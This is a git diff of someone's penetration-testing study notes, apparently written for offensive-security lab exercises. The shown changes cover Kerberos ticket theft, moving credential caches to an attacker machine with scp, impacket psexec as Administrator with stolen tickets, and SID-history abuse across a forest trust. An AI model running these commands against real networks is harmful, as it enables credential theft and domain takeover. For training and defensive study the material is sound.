@@ -512,6 +512,7 @@ runas /user:corp\jen powershell.exe
 * Copy credential cache files to Kali
   *   ```bash
       scp root@linuxvictim:/tmp/krb5cc_607000500_qZWKpe .
+      #scp -i  ssh_key pete@complyedge.com@web05:/tmp/krb5cc_75401103_PlYU68 .
       ```
 
 
@@ -521,15 +522,11 @@ runas /user:corp\jen powershell.exe
       ```
 
 
-* Install the following, if required
-  *   ```bash
+*   Install the following, if required
+
+    * ```bash
       sudo apt install krb5-user
       ```
-
-
-  *
-
-      <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Add target DC and generic domain to /etc/hosts
@@ -540,9 +537,8 @@ runas /user:corp\jen powershell.exe
 
 * IMPT: THE SOURCE OF THE KERBEROS REQUEST MATTERS!!! --> SET UP [LIGOLO-NG!](../post-exploitation/port-forwarding-pivoting.md#ligolo-ng)
 * Then, can
-  * ```bash
-    python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
-    ```
+  * <pre class="language-bash"><code class="lang-bash"><strong>python3 psexec.py Administrator@DC01.CORP1.COM -k -no-pass
+    </strong></code></pre>
 
 </details>
 
@@ -983,6 +979,11 @@ nslookup appsrv01
       ```
 
 
+* Use ccache file
+  * ```
+    mv administrator@cifs_jump09.ops.comply.com@OPS.COMPLY.COM.ccache new_admin.ccache
+    KRB5CCNAME=/home/kali/Documents/offsec/challenges/5/new_admin.ccache
+    ```
 * Execute Commands as Administrator
   * ```powershell
     impacket-psexec administrator@backup01.corp.com -k -no-pass
@@ -1094,6 +1095,7 @@ nslookup appsrv01
 
 * Forest trust has SID Filtering
   * Contents in the ExtraSids field are filtered, grp memberships are not blindly trusted
+  * Moving from corp1.com to corp2.com
   *   ```powershell
       # Enable sidhistory (Requires DA of target corp2.com)
       netdom trust corp2.com /d:corp1.com /enablesidhistory:yes
@@ -1102,7 +1104,7 @@ nslookup appsrv01
       ```
 
 
-* Need to find user with RID >= 1000 && user in domain local security groups so as not to be filtered
+* Need to find user with RID >= 1000 && user in domain local security groups so as not to be filtered (Moving from corp1.com to corp2.com)
   * ```powershell
     # Enumerate members of the corp2.com built-in administrators group
     Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
